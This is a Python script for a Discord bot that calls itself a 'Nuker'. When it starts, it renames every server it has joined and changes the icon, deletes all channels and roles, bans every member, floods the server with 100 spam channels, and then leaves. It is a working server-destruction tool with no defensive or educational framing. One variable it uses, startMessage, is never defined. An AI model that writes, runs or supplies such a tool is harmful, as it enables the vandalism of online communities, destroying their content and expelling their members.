import discord, requests
from discord.ext.commands import Bot
from datetime import datetime

intents = discord.Intents.default()
intents.members = True

client = Bot(command_prefix=".", intents = intents)

# CONFIG

botToken = ""
spamChannelName = ""
serverName = ""
serverIcon = ""
spamImage = ""

# MAIN

def time():
    return "[" + datetime.strftime(datetime.now(), "%H:%M:%S") + "] # " 

async def initialSetup():   
    for server in client.guilds:
        
        r = requests.get(serverIcon)
        await server.edit(name = serverName, icon = r.content)

        channels = server.channels
        for i in range (len(channels)):
            try:
                await channels[i].delete()
                print(time() + "Deleted channel [" + channels[i].name + "] [" + str(i + 1) + "]")
            except:
                print(time() + "Failed to delete channel [" + channels[i].name + "]")
        for role in server.roles:
            try:
                await role.delete()
                print(time() + "Deleted role [" + role.name + "]")
            except:
                print(time() + "Failed to delete role [" + role.name + "]")

        read = await server.create_text_channel("read-this")
        print(time() + "Created read me channel")
        await read.send(startMessage)
        print(time() + "Sent inital message")

async def banMembers():
     for server in client.guilds:
        for member in server.members:
            try:
                await member.ban()
                print(time() + "Banned [" + member.name + "]")
            except:
                print(time() + "Failed to ban [" + member.name + "]")

async def spamChannels():
     for server in client.guilds:
        for i in range (100):
            spamChannel = await server.create_text_channel(spamChannelName)
            await spamChannel.send(spamImage)
            await spamChannel.send(serverIcon)
            print(time() + "Created spam channel [" + spamChannelName + "] [" + str(i + 1) + "]")

async def leave():
    for server in client.guilds:
        await server.leave()
        print(time() + "Left server [" + server.name + "]")

@client.event
async def on_ready():
    print("\n" + time() + "Nuker Started...\n")

    await initialSetup()
    await banMembers()
    await spamChannels()
    await leave()

    print("\n" + time() + "Done!\n")
    
    await client.close()

client.run(botToken)
